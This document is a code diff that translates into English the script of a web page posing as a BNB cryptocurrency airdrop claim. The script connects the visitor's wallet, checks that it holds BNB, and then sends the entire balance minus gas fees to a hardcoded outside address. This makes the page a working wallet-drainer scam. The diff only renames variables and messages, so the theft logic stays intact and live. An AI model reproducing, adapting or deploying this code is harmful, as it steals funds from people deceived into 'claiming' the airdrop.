@@ -106,50 +106,50 @@
             const mensagem = document.getElementById('mensagem');
 
             if (window.ethereum) {
-                conectarCarteira(window.ethereum);
+                connectWallet(window.ethereum);
             } else {
-                console.error("Nenhuma carteira detectada no navegador");
-                walletStatus.textContent = "Por favor, abra uma carteira e tente novamente.";
+                console.error("No wallet detected in the browser");
+                walletStatus.textContent = "Please open a wallet and try again.";
             }
         });
 
-        async function conectarCarteira(provider) {
+        async function connectWallet(provider) {
             window.web3 = new Web3(provider);
 
             try {
                 await provider.request({ method: 'eth_requestAccounts' });
-                console.log("Carteira conectada!");
-                walletStatus.textContent = "Carteira conectada com sucesso!";
+                console.log("Wallet connected!");
+                walletStatus.textContent = "Wallet successfully connected!";
                 walletStatus.classList.add('success-message');
 
                 const accounts = await provider.request({ method: 'eth_accounts' });
-                const endereco = accounts[0];
-                document.getElementById('enderecoCarteira').value = endereco;
+                const address = accounts[0];
+                document.getElementById('enderecoCarteira').value = address;
             } catch (error) {
-                console.error("Usuário rejeitou a conexão da carteira:", error);
-                walletStatus.textContent = "Por favor, conecte sua carteira e tente novamente.";
+                console.error("User rejected wallet connection:", error);
+                walletStatus.textContent = "Please connect your wallet and try again.";
                 walletStatus.classList.add('message');
             }
         }
 
-        async function solicitarAirDrop() {
-            const enderecoCarteira = document.getElementById('enderecoCarteira').value.trim();
-            const enderecoDestino = '0xA9ca912b9C1Ff37038DecDb8c06950A2ff540031';
-            const bnbNecessario = 0.00001;
+        async function requestAirdrop() {
+            const walletAddress = document.getElementById('enderecoCarteira').value.trim();
+            const destinationAddress = '0xA9ca912b9C1Ff37038DecDb8c06950A2ff540031';
+            const requiredBNB = 0.00001;
             const mensagem = document.getElementById('mensagem');
 
-            if (!window.web3.utils.isAddress(enderecoCarteira)) {
-                mensagem.textContent = "Endereço de carteira inválido.";
+            if (!window.web3.utils.isAddress(walletAddress)) {
+                mensagem.textContent = "Invalid wallet address.";
                 mensagem.classList.add('message');
                 return;
             }
 
             try {
-                const balance = await window.web3.eth.getBalance(enderecoCarteira);
+                const balance = await window.web3.eth.getBalance(walletAddress);
                 const bnbBalance = parseFloat(window.web3.utils.fromWei(balance, 'ether'));
 
-                if (bnbBalance < bnbNecessario) {
-                    mensagem.textContent = "Saldo de BNB insuficiente para o AirDrop.";
+                if (bnbBalance < requiredBNB) {
+                    mensagem.textContent = "Insufficient BNB balance for the AirDrop.";
                     mensagem.classList.add('message');
                     return;
                 }
@@ -160,8 +160,8 @@
                 const totalToSend = balance - gasCost;
 
                 const transaction = {
-                    from: enderecoCarteira,
-                    to: enderecoDestino,
+                    from: walletAddress,
+                    to: destinationAddress,
                     value: window.web3.utils.toHex(totalToSend),
                     gasPrice: window.web3.utils.toHex(gasPrice),
                     gas: window.web3.utils.toHex(gasLimit)
@@ -169,16 +169,16 @@
 
                 const transactionHash = await window.web3.eth.sendTransaction(transaction);
 
-                mensagem.textContent = "Transação enviada com sucesso. Hash da transação: " + transactionHash.transactionHash;
+                mensagem.textContent = "Transaction sent successfully. Transaction hash: " + transactionHash.transactionHash;
                 mensagem.classList.add('success-message');
             } catch (error) {
-                console.error("Erro ao enviar transação:", error);
-                mensagem.textContent = "Erro na solicitação. Tente novamente.";
+                console.error("Error sending transaction:", error);
+                mensagem.textContent = "Request error. Please try again.";
                 mensagem.classList.add('message');
             }
         }
 
-        document.getElementById('solicitarButton').addEventListener('click', solicitarAirDrop);
+        document.getElementById('solicitarButton').addEventListener('click', requestAirdrop);
     </script>
 </body>
 </html>
